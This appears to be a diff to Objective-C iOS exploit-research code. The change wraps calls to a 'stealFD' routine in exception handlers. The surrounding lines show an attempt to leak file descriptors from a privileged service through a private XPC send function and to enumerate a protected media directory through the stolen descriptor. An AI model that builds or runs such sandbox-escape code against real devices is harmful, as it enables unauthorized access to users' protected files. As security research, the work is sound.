@@ -205,7 +205,8 @@ static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);
     }
 
     // Now try fd leak
-    int stolenFd = [self stealFD:target];
+    int stolenFd = -1;
+    @try { stolenFd = [self stealFD:target]; } @catch (NSException *e) { [self journal:[NSString stringWithFormat:@"EXC: %@", e.reason]]; }
     if (stolenFd >= 0) {
         [report appendFormat:@"STOLEN FD: %d\n", stolenFd];
 
@@ -241,7 +242,8 @@ static int (*figXPCConnectionSendSyncMessage)(void *, void *, void **);
     // Try directory enumeration
     [report appendString:@"\n--- Phase 3: directory enumeration ---\n"];
     NSString *dirPath = @"/private/var/mobile/Media/iTunes_Control/iTunes/";
-    int dirFd = [self stealFD:dirPath];
+    int dirFd = -1;
+    @try { dirFd = [self stealFD:dirPath]; } @catch (NSException *e) { [self journal:[NSString stringWithFormat:@"EXC: %@", e.reason]]; }
     if (dirFd >= 0) {
         [report appendFormat:@"directory fd: %d\n", dirFd];
         DIR *d = fdopendir(dirFd);
